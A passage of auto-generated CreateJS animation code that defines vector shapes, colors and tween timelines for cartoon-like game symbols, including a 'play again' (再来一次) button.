	this.shape_14.graphics.f("#FF0087").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_14.setTransform(83.3,88.3);

	this.shape_15 = new cjs.Shape();
	this.shape_15.graphics.f("#457703").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_15.setTransform(83.3,88.3);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape}]}).to({state:[{t:this.shape_1}]},1).to({state:[{t:this.shape_2}]},1).to({state:[{t:this.shape_3}]},1).to({state:[{t:this.shape_4}]},1).to({state:[{t:this.shape_5}]},1).to({state:[{t:this.shape_6}]},1).to({state:[{t:this.shape_7}]},1).to({state:[{t:this.shape_8}]},1).to({state:[{t:this.shape_9}]},1).to({state:[{t:this.shape_10}]},1).to({state:[{t:this.shape_11}]},1).to({state:[{t:this.shape_12}]},1).to({state:[{t:this.shape_13}]},1).to({state:[{t:this.shape_14}]},1).to({state:[{t:this.shape_15}]},1).wait(1));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,166.6,176.7);


(lib.再来一次 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// 图层 2
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#202330").s().p("Ah1CoQgKgTAVgNQBCgmAdgyQAUgrADhFQAAgVAWgBQAVABABAVIAAAkQAAAiAUAeQAaA1BCAvQANANgMATQgPAMgPgHQhIg1ghhLQgjBXhNApQgLAEgJAAQgMAAgHgJgAijChQgQgJAHgSQAehJAMgtQAGgSAWADQAWAGgDAUQgSBLgdA0QgIAKgMAAQgGAAgHgDgABrAXQgSgMAHgRQASgmAFgjQADgNgOAAIhzAAQgWBAgYAZQgPANgSgIQgQgIAKgSQAmg8AUhRQAFgNAUADQASAGgCANIgGAWICMAAQAfAAgDAcQgHBHgaAuQgHAOgMAAQgFAAgFgCgAh8g0IgthWQgJgRASgLQASgJANAOQAbAoASAvQAEARgSAMQgGADgFAAQgJAAgGgKg");
	this.shape.setTransform(165.2,39.1);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#202330").s().p("AiYAXQgSAAgBgXQABgVASgBIEuAAQATABADAVQgDAXgTAAg");
	this.shape_1.setTransform(126.9,39.1);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#202330").s().p("AgVCfIAAhoQgqBBhIAmQgVAKgNgPQgMgSAVgKQBGgiAshDIhsAAQgRAAgDgTQACgTAQgCIA4AAQAAAAAAAAQgBAAAAAAQAAAAgBgBQAAAAAAAAIgCgGIgQgnQgIgRASgIQASgGAKARIAOAgQABAGACACQAGAPgFAFIArAAIAAhWIh4AAQgQAAgCgUQADgUAQgBIB3AAIAAgRQAAgOAVgCQARADACAPIAAAPIB2AAQASABACAUQAAAUgRAAIh5AAIAABWIAoAAIAWg7QAGgSAVADQASAGgFATIgSAxIA3AAQAPACACATQgDATgPAAIhwAAQAwBCBEAgQARAKgJARQgLASgSgIQhBgeg4hIIAABoQgCAQgRAAQgVgCAAgQg");
	this.shape_2.setTransform(88.9,39);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#202330").s().p("AiICWIAAhRIgOAAQgUAAgCgTQABgVATgBIAQAAIAAhgQgDgiAnABIBTAAIAAgXIiAAAQgSAAAAgVQAAgUASgBIElAAQATABABAUQgBAVgTAAIh8AAIAAAXIBRAAQAlgBgBAgIAABiIAPAAQARABAAAVQgCATgQAAIgNAAIAAA8QACAvhNgMQgYgDAAgUQADgRAWAAQABABAAAAQABAAAAAAQABABABAAQAAAAABAAQAaADABgPIAAgtIjBAAIAABRQgBAQgVABQgVgBAAgQgAAYAcIBKAAIAAgcIhKAAgAhdAcIBMAAIAAgcIhMAAgAAYgiIBKAAIAAgYQgCgDgDgBIhFAAgAhdg6IAAAYIBMAAIAAgcIhHAAQgFABAAADg");
	this.shape_3.setTransform(50.7,39.7);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).wait(4));

	// 图层 1
	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f("#FFA300").s().p("ArqGbQiJAAhhhPQhghQAAhxIAAkVQAAhxBghPQBhhQCJAAIXVAAQCJAABgBQQBhBPAABxIAAEVQAABxhhBQQhgBPiJAAg");
	this.shape_4.setTransform(107.8,41.2);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f("#FFFEFD").s().p("ArqGbQiJAAhhhPQhghQAAhxIAAkVQAAhxBghPQBhhQCJAAIXVAAQCJAABgBQQBhBPAABxIAAEVQAABxhhBQQhgBPiJAAg");
	this.shape_5.setTransform(107.8,41.2);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_4}]}).to({state:[{t:this.shape_5}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,215.6,82.4);


(lib.tu16 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAAAgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAshLQAwhVBMgqIgBAaQgCAhgKAhQgcBphQBHQgLAKgQAEIgIABQgMAAAAgPg");
	this.shape_1.setTransform(35.7,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_3.setTransform(47.6,66.4);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgUgbIApA3");
	this.shape_4.setTransform(25.1,74);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,73.9);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#457703").s().p("ADSHRInfAAQhaABhggYQjAgvgdh7QgOgsAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B+IA3ADQAKhCAnhDQBPiFCOgEIAHAXQAIAdACAfQAIBkgtBUIA8ABQBLAFBDARQDZA4BHCfIAsgJQAvABAMAzIACALQACANgEARQgKA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAg");
	this.shape_6.setTransform(68.3,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAcAAAAAIgeARAgUgcIAUAcAAfgRIgfAR");
	this.shape_7.setTransform(25.1,74);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADSHRInfAAQhaABhggYQjAgvgdh7QgOgsAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B+IA3ADQAKhCAnhDQBPiFCOgEIAHAXQAIAdACAfQAIBkgtBUIA8ABQBLAFBDARQDZA4BHCfIAsgJQAvABAMAzIACALQACANgEARQgKA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAgAmZEuIgWgdIAggSIggASIgVgdIAVAdIgfASIAfgSgAmvERg");
	this.shape_8.setTransform(68.3,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.7,93.2);


(lib.tu15 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAAAgPg");
	this.shape.setTransform(65.2,24.4);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAABgPg");
	this.shape_1.setTransform(35.6,24.4);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_3.setTransform(47.6,66.3);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgTgbIAoA3");
	this.shape_4.setTransform(25.2,73.9);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,73.9);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#FF0087").s().p("ADTHRInfAAQhaABhggYQi/gwgeh7QgOgrAShFQAkiIChh4QAIhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B9IA3AEQAKhCAnhDQBPiGCOgEIAHAXQAIAdACAgQAIBkgtBTIA8ACQBLAEBDASQDZA4BHCfIAtgKQAuABANA0IAAAoQgLA1g1A8IgMAgQgTAngjAgQhrBijZAAIgRAAg");
	this.shape_6.setTransform(68.2,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAcAAAAAIgeASAgTgcIATAcAAfgRIgfAR");
	this.shape_7.setTransform(25.1,73.9);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADTHRInfAAQhaABhggYQi/gwgeh7QgOgrAShFQAkiIChh4QAIhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B9IA3AEQAKhCAnhDQBPiGCOgEIAHAXQAIAdACAgQAIBkgtBTIA8ACQBLAEBDASQDZA4BHCfIAtgKQAuABANA0IAAAoQgLA1g1A8IgMAgQgTAngjAgQhrBijZAAIgRAAgAmYEuIgVgdIAfgTIgfATIgVgdIAVAdIggASIAggSgAmtERg");
	this.shape_8.setTransform(68.2,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.5,93.1);


(lib.tu14 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAAAgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAthLQAvhVBMgqIgBAaQgDAhgIAhQgcBphQBHQgNAKgPAEIgIABQgMAAAAgPg");
	this.shape_1.setTransform(35.7,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAJgJAKAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgKAAgJgJg");
	this.shape_3.setTransform(47.6,66.4);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgTgbIAnA3");
	this.shape_4.setTransform(25.2,74);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,74);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#0084FF").s().p("ADTHRIneAAQhaABhggYQjAgvgeh7QgOgsAShEQAkiJChh4QAIhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B+IA3ADQAKhCAnhDQBPiFCOgEIAHAXQAIAdACAfQAJBkguBUIA8ABQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAg");
	this.shape_6.setTransform(68.2,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgTgbIATAbAAfgRIgfAR");
	this.shape_7.setTransform(25.1,74);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADTHRIneAAQhaABhggYQjAgvgeh7QgOgsAShEQAkiJChh4QAIhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B+IA3ADQAKhCAnhDQBPiFCOgEIAHAXQAIAdACAfQAJBkguBUIA8ABQBLAFBDARQDZA4BHCfIAtgJQAuABANAzIAAApQgLA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAgAmYEuIgVgdIAfgSIgfASIgVgdIAVAdIggATIAggTgAmtERg");
	this.shape_8.setTransform(68.2,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.5,93.2);


(lib.tu13 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QAAhCAthLQAwhVBMgqIgBAaQgDAhgIAhQgdBphPBHQgNAKgPAEIgIABQgNAAAAgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgIABQgNAAAAgPg");
	this.shape_1.setTransform(35.6,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAJgJAKAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgKAAgJgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_3.setTransform(47.6,66.4);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgUgbIApA3");
	this.shape_4.setTransform(25.1,74);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,74);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#F283AC").s().p("ADSHRInfAAQhaABhggYQjAgvgdh7QgOgsAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg9B+IA3ADQALhCAnhDQBPiFCNgEIAHAXQAIAdADAfQAIBkguBUIA9ABQBKAFBEARQDZA4BHCfIAsgJQAvABAMAzIACALQACANgEARQgKA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAg");
	this.shape_6.setTransform(68.3,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgUgbIAUAbAAfgRIgfAR");
	this.shape_7.setTransform(25.1,74);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADSHRInfAAQhaABhggYQjAgvgdh7QgOgsAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg9B+IA3ADQALhCAnhDQBPiFCNgEIAHAXQAIAdADAfQAIBkguBUIA9ABQBKAFBEARQDZA4BHCfIAsgJQAvABAMAzIACALQACANgEARQgKA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAgAmZEuIgVgdIAfgSIgfASIgWgdIAWAdIggATIAggTgAmuERg");
	this.shape_8.setTransform(68.3,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.7,93.2);


(lib.tu12 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhWBMgqIgBAbQgCAggJAiQgcBphQBHQgMAKgQAEIgHACQgOAAAAgQg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAshLQAwhVBMgrIgBAbQgCAggJAiQgcBphQBHQgMAKgQAEIgIACQgNAAABgQg");
	this.shape_1.setTransform(35.6,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_3.setTransform(47.6,66.3);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgUgcIApA5");
	this.shape_4.setTransform(25.1,73.9);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,73.9);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#FDF901").s().p("ADSHRInfAAQhaABhggYQjAgwgdh7QgOgrAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B9IA3AEQAKhCAnhDQBPiFCOgFIAHAXQAIAeACAfQAIBkguBTIA9ACQBKAFBEARQDZA4BHCfIAsgKQAvABAMA0IACALQACANgEARQgKA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAg");
	this.shape_6.setTransform(68.3,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgUgcIAUAcAAfgRIgfAR");
	this.shape_7.setTransform(25.1,73.9);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADSHRInfAAQhaABhggYQjAgwgdh7QgOgrAShEQAkiJCgh4QAJhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B9IA3AEQAKhCAnhDQBPiFCOgFIAHAXQAIAeACAfQAIBkguBTIA9ACQBKAFBEARQDZA4BHCfIAsgKQAvABAMA0IACALQACANgEARQgKA0g1A9IgMAgQgTAngjAfQhrBijZAAIgRAAgAmZEuIgVgdIAfgSIgfASIgWgdIAWAdIggASIAggSgAmuERg");
	this.shape_8.setTransform(68.3,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.7,93.1);


(lib.tu11 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhWBMgqIgBAbQgCAggJAiQgcBphQBHQgMAKgQAEIgHACQgOAAAAgQg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAshLQAwhVBMgrIgBAbQgCAggKAiQgcBphPBHQgMAKgQAEIgIACQgMAAAAgQg");
	this.shape_1.setTransform(35.7,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_3.setTransform(47.6,66.3);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f().s("#000000").ss(0.5).p("AgUgcIApA5");
	this.shape_4.setTransform(25.1,73.9);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f().s("#000000").ss(0.5).p("AAfgRIg9Aj");
	this.shape_5.setTransform(25.1,73.9);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#8B8B8B").s().p("ADTHRIneAAQhaABhggYQjAgwgeh7QgOgrAShEQAkiJChh4QAIhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B9IA3AEQAKhCAnhDQBPiFCOgFIAHAXQAIAdACAgQAJBkguBTIA8ACQBLAFBDARQDZA4BHCfIAtgKQAuABANA0IAAApQgLA0g1A9IgMAgQgTAmgjAgQhrBijYAAIgSAAg");
	this.shape_6.setTransform(68.2,46.6);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f().s("#FFFFFF").ss(0.5).p("AAAAAIAVAdAAAAAIgeASAgUgcIAUAcAAfgRIgfAR");
	this.shape_7.setTransform(25.1,73.9);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#FFFFFF").s().p("ADTHRIneAAQhaABhggYQjAgwgeh7QgOgrAShEQAkiJChh4QAIhPAphWQBRirCjgfIAIARQAIAYACAfQAGBgg8B9IA3AEQAKhCAnhDQBPiFCOgFIAHAXQAIAdACAgQAJBkguBTIA8ACQBLAFBDARQDZA4BHCfIAtgKQAuABANA0IAAApQgLA0g1A9IgMAgQgTAmgjAgQhrBijYAAIgSAAgAmYEuIgVgdIAfgSIgfASIgWgdIAWAdIggASIAggSgAmtERg");
	this.shape_8.setTransform(68.2,46.6);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]}).to({state:[{t:this.shape_8},{t:this.shape_7}]},1).wait(3));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(0,0,136.5,93.1);


(lib.tu10 = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// timeline functions:
	this.frame_0 = function() {
		this.stop();
	}

	// actions tween:
	this.timeline.addTween(cjs.Tween.get(this).call(this.frame_0).wait(4));

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FFDCE9").s().p("AhUB/QABhCAshLQAwhVBMgqIgBAaQgCAhgJAhQgcBphQBHQgMAKgQAEIgHABQgOAAAAgPg");
	this.shape.setTransform(65.2,24.5);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#FFDCE9").s().p("AhTB/QAAhCAthLQAvhVBMgqIgBAaQgDAhgIAhQgcBphQBHQgMAKgQAEIgIABQgMAAAAgPg");
	this.shape_1.setTransform(35.7,24.5);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#000000").s().p("AgTAUQgJgIAAgMQAAgLAJgIQAIgJALAAQAMAAAIAJQAJAIAAALQAAAMgJAIQgIAJgMAAQgLAAgIgJg");
	this.shape_2.setTransform(12.1,59.9);

	this.shape_3 = new cjs.Shape();
